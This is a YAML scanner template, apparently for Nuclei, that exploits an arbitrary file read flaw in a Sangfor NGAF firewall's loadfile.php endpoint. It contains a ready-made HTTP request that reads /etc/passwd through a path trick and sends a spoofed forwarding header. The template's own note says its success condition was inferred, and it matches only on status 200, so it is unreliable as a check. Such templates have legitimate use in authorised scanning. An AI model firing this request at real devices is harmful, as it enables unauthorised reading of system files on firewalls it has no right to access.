id: poc-4edd330bd293a9b821c7
info:
  name: 深信服下一代防火墙NGAFloadfile存在任意文件读取漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: lfi,2025
http:
- raw:
  - 'GET /svpn_html/loadfile.php?file=/etc/./passwd HTTP/1.1

    Host: {{Hostname}}

    Accept: */*

    Content-Type: application/x-www-form-urlencoded

    y-forwarded-for: 127.0.0.1'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
